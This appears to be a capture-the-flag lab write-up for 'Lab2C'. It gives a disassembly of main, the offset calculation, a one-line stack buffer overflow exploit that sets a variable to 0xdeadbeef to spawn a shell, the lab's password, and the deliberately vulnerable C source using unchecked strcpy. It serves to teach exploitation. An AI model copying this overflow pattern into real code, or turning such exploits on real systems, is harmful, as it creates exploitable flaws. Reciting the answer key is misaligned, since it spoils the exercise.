## Lab2C

```
Dump of assembler code for function main:
   0x080486cd <+0>:     push   ebp
   0x080486ce <+1>:     mov    ebp,esp
   0x080486d0 <+3>:     and    esp,0xfffffff0
   0x080486d3 <+6>:     sub    esp,0x30
   0x080486d6 <+9>:     cmp    DWORD PTR [ebp+0x8],0x2
   0x080486da <+13>:    je     0x80486f8 <main+43>
   0x080486dc <+15>:    mov    eax,DWORD PTR [ebp+0xc]
   0x080486df <+18>:    mov    eax,DWORD PTR [eax]
   0x080486e1 <+20>:    mov    DWORD PTR [esp+0x4],eax
   0x080486e5 <+24>:    mov    DWORD PTR [esp],0x80487f4
   0x080486ec <+31>:    call   0x8048550 <printf@plt>
   0x080486f1 <+36>:    mov    eax,0x1
   0x080486f6 <+41>:    jmp    0x8048742 <main+117>
   0x080486f8 <+43>:    mov    DWORD PTR [esp+0x2c],0x0
   0x08048700 <+51>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048703 <+54>:    add    eax,0x4
   0x08048706 <+57>:    mov    eax,DWORD PTR [eax]
   0x08048708 <+59>:    mov    DWORD PTR [esp+0x4],eax
   0x0804870c <+63>:    lea    eax,[esp+0x1d]
   0x08048710 <+67>:    mov    DWORD PTR [esp],eax
   0x08048713 <+70>:    call   0x8048560 <strcpy@plt>
   0x08048718 <+75>:    cmp    DWORD PTR [esp+0x2c],0xdeadbeef
   0x08048720 <+83>:    jne    0x8048729 <main+92>
   0x08048722 <+85>:    call   0x80486ad <shell>
   0x08048727 <+90>:    jmp    0x804873d <main+112>
   0x08048729 <+92>:    mov    eax,DWORD PTR [esp+0x2c]
   0x0804872d <+96>:    mov    DWORD PTR [esp+0x4],eax
   0x08048731 <+100>:   mov    DWORD PTR [esp],0x8048808
   0x08048738 <+107>:   call   0x8048550 <printf@plt>
   0x0804873d <+112>:   mov    eax,0x0
   0x08048742 <+117>:   leave  
   0x08048743 <+118>:   ret    
End of assembler dump.
```

```
0x08048713 <+70>:    call   0x8048560 <strcpy@plt>
Copies user input at esp+0x1d

0x08048718 <+75>:    cmp    DWORD PTR [esp+0x2c],0xdeadbeef
Compares value at esp+0x2c with 0xdeadbeef

0x2c - 0x1d = 15 (in decimal)
```

Solution - `./lab2C $(python -c "print 'a'*15 + '\xef\xbe\xad\xde'")`

**Pass - `1m_all_ab0ut_d4t_b33f`**

***

### Original source
```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/*
 * compiled with:
 * gcc -O0 -fno-stack-protector lab2C.c -o lab2C
 */

void shell()
{
        printf("You did it.\n");
        system("/bin/sh");
}

int main(int argc, char** argv)
{
        if(argc != 2)
        {
                printf("usage:\n%s string\n", argv[0]);
                return EXIT_FAILURE;
        }

        int set_me = 0;
        char buf[15];
        strcpy(buf, argv[1]);

        if(set_me == 0xdeadbeef)
        {
                shell();
        }
        else
        {
                printf("Not authenticated.\nset_me was %d\n", set_me);
        }

        return EXIT_SUCCESS;
}

```